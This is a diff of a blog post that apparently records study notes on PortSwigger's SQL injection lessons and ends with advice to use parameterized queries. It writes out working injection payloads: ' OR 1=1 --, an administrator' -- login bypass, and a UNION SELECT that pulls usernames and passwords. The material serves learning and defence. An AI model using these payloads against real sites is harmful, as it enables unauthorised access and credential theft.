@@ -11,6 +11,8 @@ tags:
 
 This article is the note of PortSwigger Web Security Academy's [SQL Injection](https://portswigger.net/web-security/sql-injection). I will take note of it and write some my opinion.
 
+<!-- more -->
+
 ## Examples
 
 - Retrieving hidden data
@@ -22,21 +24,25 @@ This article is the note of PortSwigger Web Security Academy's [SQL Injection](h
 ### Retrieving hidden data
 
 For example, there is a URL:
+
 ```
 https://insecure-website.com/products?category=Gifts
 ```
 
 and SQL like:
+
 ```SQL
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 ```
 
 Thus, it can be injected by:
+
 ```
 https://insecure-website.com/products?category=' OR 1=1 --
 ```
 
 This will results in the SQL query, and show every products:
+
 ```SQL
 SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
 ```
@@ -46,11 +52,13 @@ SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
 It can bypass login or other business logic too.
 
 In case of SQL query like:
+
 ```SQL
 SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
 ```
 
 We can login as administrator by input username `administrator' --` and left password blank, results in the SQL query:
+
 ```SQL
 SELECT * FROM users WHERE username = 'administrator' --' AND password = ''
 ```
@@ -58,16 +66,19 @@ SELECT * FROM users WHERE username = 'administrator' --' AND password = ''
 ### UNION attack
 
 We can use UNION to get other table's data, for example:
+
 ```SQL
 SELECT name, description FROM products WHERE category = '{input}'
 ```
 
 and we input:
+
 ```
 ' UNION SELECT username, password FROM users --
 ```
 
 result in query:
+
 ```SQL
 SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users --'
 ```
@@ -91,6 +102,7 @@ Because every database have unique syntax, function, or variable...(there are so
 After we know what kind of database is it, we can grab some informations about databases, tables, and columns.
 
 For example, most database(MSSQL, MySQL, PostgreSQL...) have a database which store there information we need:
+
 ```SQL
 SELECT * FROM information_schema.tables
 ```
@@ -130,11 +142,13 @@ So after all, how do we prevent these vulnerabilites?
 We can use parameterized query(also known as prepared statements) instead of directly concatenate strings together.
 
 DONT USE:
+
 ```php
 $query = "SELECT * FROM products WHERE category = '"+ $input + "'";
 ```
 
 USE:
+
 ```php
 $sql = "SELECT * FROM products WHERE category = :category";
 $sth = $dbh->prepare($sql, array(PDO::ATTR_CURSOR => PDO::CURSOR_FWDONLY));
@@ -149,5 +163,5 @@ As a developer, we need to make sure we know the meaning of every single line of
 
 ## References
 
-- https://portswigger.net/web-security/sql-injection
-- https://portswigger.net/web-security/sql-injection/cheat-sheet
+- <https://portswigger.net/web-security/sql-injection>
+- <https://portswigger.net/web-security/sql-injection/cheat-sheet>
